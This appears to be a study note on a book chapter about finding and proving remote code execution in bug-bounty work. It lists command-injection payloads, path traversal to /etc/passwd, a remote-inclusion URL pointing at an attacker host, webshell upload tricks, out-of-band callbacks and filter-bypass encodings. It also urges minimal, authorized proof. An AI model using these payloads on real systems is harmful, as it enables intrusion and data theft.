# Ch18: Remote Code Execution

Source: Chapter 18. RCE = attacker input reaches a command/code interpreter: OS shell (command injection), language eval (code injection), unsafe include (file inclusion), or via another bug (deserialization gadget, SSTI, upload+execution). The skill's job: recognize the sinks, prove execution safely.

## Hunting — the sinks

- **Command injection**: params reaching `system()`, `exec()`, backticks, `os.popen`, `ProcessBuilder`. Where? Ping/traceroute tools, PDF/image converters (ImageMagick `convert`), backup/export filename fields, SMTP headers, filename params in unzip operations. Payloads: `;id`, `|id`, `&&id`, `` `id` ``, `$(id)`, newline `%0aid`.
- **Code injection**: input reaching `eval()`, `assert()`, `preg_replace /e`, `include($_GET['p'])`, template eval. Probe with harmless expressions (`phpinfo()`, `7*7` variants).
- **File inclusion**: `?page=about` → `?page=../../../../etc/passwd` (LFI → read source/keys/logs → log-poisoning→RCE); `?page=http://attacker/shell` (RFI when `allow_url_include`).
- **File upload → exec**: webshell upload + predict path; double extension `shell.php.jpg`, content-type confusion, path traversal in filename `../../www/shell.php`, `.htaccess`/config override upload.
- **Blind RCE**: nothing reflected — use `sleep 5` timing, DNS/HTTP OOB (`curl http://COLLAB`, `` `nslookup x.COLLAB` ``), or write a file you can fetch via a known web path.

## Proof discipline (the book's rule)

Prove with the *minimum*: `id`, `whoami`, `hostname`, `sleep`, OOB ping. Do **not** `cat /etc/shadow`, `ls` user dirs, create files you can't remove, or pivot — that's beyond demonstrating impact and likely out of policy.

## Bypasses

- Filtered `;`/`|` → newline, `$IFS`, `{cmd,arg}` brace expansion, `$(...)`, hex/concat strings, `a=c;b=a;` variable building.
- Keyword filter on `whoami` → `w''hoami`, `w\hoami`, `${PATH:0:1}hoami`, base64 `echo d2hvYW1p|base64 -d|sh`.
- LFI needs `.php` suffix → null byte `%00` (old PHP), path truncation, `php://filter/convert.base64-encode/resource=` reads source without executing.

## Escalation & first bug

Command exec → reverse shell only in authorized labs; on bounties, `id`+OOB is enough → report. Chain: LFI→log poisoning→RCE; upload→guess path→RCE; SSTI/deserialization→RCE (see ch11/ch13).

**Checklist**: map interpreter-reaching inputs → probe metacharacters/`$(id)` → blind? timing+OOB → minimal proof → document sink & command → stop.
